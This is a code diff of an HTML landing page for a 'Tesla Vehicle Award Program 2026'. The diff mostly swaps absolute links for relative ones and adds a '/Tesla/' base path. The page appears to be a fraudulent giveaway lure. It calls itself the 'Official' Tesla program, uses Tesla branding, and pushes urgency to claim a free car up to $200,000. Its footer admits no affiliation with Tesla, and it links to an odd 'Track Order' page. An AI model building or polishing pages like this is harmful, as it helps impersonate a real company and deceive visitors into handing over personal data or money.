@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <base href="/Tesla/">
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="description" content="Official Tesla Vehicle Award Program 2026 — Enter for your chance to win a brand-new Tesla Model 3, Model Y, Model S, Model X, Cybertruck, or Roadster. One entry per person, completely free.">
@@ -11,7 +12,7 @@
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="css/style.css">
   <style>
     .hero{background:white;min-height:100vh;display:grid;grid-template-columns:1fr 1fr;align-items:center;gap:48px;padding:100px 80px 60px;max-width:1300px;margin:0 auto;}
     @media(max-width:900px){.hero{grid-template-columns:1fr;padding:100px 24px 56px;text-align:center;}.hero-img-wrap{order:-1;margin:0 auto;max-width:400px;}.hero-left{order:1;}}
@@ -97,7 +98,7 @@
 <!-- NAV -->
 <nav class="nav" id="navbar">
   <div class="nav-inner">
-    <a href="/" class="nav-logo">
+    <a href="index.html" class="nav-logo">
       <svg width="22" height="22" viewBox="0 0 24 24" fill="var(--red)"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3l7 4v2h-3v6h-2v-6H8V9H5l7-4z"/></svg>
       TESLA
     </a>
@@ -106,9 +107,9 @@
       <li><a href="#vehicles">Vehicles</a></li>
       <li><a href="#winners">Winners</a></li>
       <li><a href="#faq">FAQ</a></li>
-      <li><a href="/track.html">Track Order</a></li>
+      <li><a href="track.html">Track Order</a></li>
     </ul>
-    <a href="/entry.html" class="btn btn-primary nav-cta">Enter Free →</a>
+    <a href="entry.html" class="btn btn-primary nav-cta">Enter Free →</a>
     <button class="nav-mobile-btn" onclick="toggleMobileMenu()" aria-label="Menu">
       <svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 6h16M4 12h16M4 18h16"/></svg>
     </button>
@@ -120,8 +121,8 @@
   <a href="#vehicles" onclick="closeMobileMenu()">Vehicles</a>
   <a href="#winners" onclick="closeMobileMenu()">Winners</a>
   <a href="#faq" onclick="closeMobileMenu()">FAQ</a>
-  <a href="/track.html" onclick="closeMobileMenu()">Track Order</a>
-  <a href="/entry.html" style="color:var(--red);font-weight:700;margin-top:8px;border-bottom:none;">⚡ Enter to Win — Free</a>
+  <a href="track.html" onclick="closeMobileMenu()">Track Order</a>
+  <a href="entry.html" style="color:var(--red);font-weight:700;margin-top:8px;border-bottom:none;">⚡ Enter to Win — Free</a>
 </div>
 
 <!-- HERO -->
@@ -146,7 +147,7 @@
     </div>
 
     <div class="hero-cta-row">
-      <a href="/entry.html" class="btn btn-primary btn-xl">⚡ Claim Your Free Entry</a>
+      <a href="entry.html" class="btn btn-primary btn-xl">⚡ Claim Your Free Entry</a>
     </div>
 
     <div class="trust-row anim-fade-up delay-4">
@@ -232,7 +233,7 @@
     </div>
     <div class="cars-grid reveal" id="homeCarGrid"></div>
     <div style="text-align:center;margin-top:40px;" class="reveal">
-      <a href="/entry.html" class="btn btn-primary btn-lg">Enter Now to Choose Your Tesla →</a>
+      <a href="entry.html" class="btn btn-primary btn-lg">Enter Now to Choose Your Tesla →</a>
     </div>
   </div>
 </section>
@@ -294,7 +295,7 @@
   <div class="section-tag" style="background:rgba(227,25,55,.25);color:var(--red-light);margin-bottom:20px;">Limited Time</div>
   <h2>Your Tesla Is Waiting.<br><span class="gradient-text">Will You Claim It?</span></h2>
   <p>Thousands of people have already entered. The program closes soon — don't miss your chance to win a vehicle worth up to $200,000, completely free.</p>
-  <a href="/entry.html" class="btn btn-primary btn-xl">⚡ Enter the Program Now</a>
+  <a href="entry.html" class="btn btn-primary btn-xl">⚡ Enter the Program Now</a>
   <div style="margin-top:24px;color:rgba(255,255,255,.35);font-size:13px;">No purchase necessary. One entry per person. Free to enter.</div>
 </div>
 
@@ -338,7 +339,7 @@
 <!-- FOOTER -->
 <footer>
   <div class="footer-inner">
-    <a href="/" class="nav-logo" style="font-size:20px;">
+    <a href="index.html" class="nav-logo" style="font-size:20px;">
       <svg width="22" height="22" viewBox="0 0 24 24" fill="var(--red)"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3l7 4v2h-3v6h-2v-6H8V9H5l7-4z"/></svg>
       TESLA AWARD PROGRAM
     </a>
@@ -347,14 +348,14 @@
       <a href="#vehicles">Vehicles</a>
       <a href="#winners">Winners</a>
       <a href="#faq">FAQ</a>
-      <a href="/entry.html">Enter Now</a>
-      <a href="/track.html">Track Order</a>
+      <a href="entry.html">Enter Now</a>
+      <a href="track.html">Track Order</a>
     </div>
     <p class="footer-legal">© 2026 Tesla Award Program. All rights reserved. This is an independent promotional award program. Tesla® is a registered trademark of Tesla, Inc. This promotion is not affiliated with, endorsed by, or sponsored by Tesla, Inc. Participation constitutes acceptance of the official rules. No purchase necessary. Void where prohibited. One entry per person.</p>
   </div>
 </footer>
 
-<script src="/js/app.js"></script>
+<script src="js/app.js"></script>
 <script>
 // Nav scroll
 window.addEventListener('scroll',()=>{
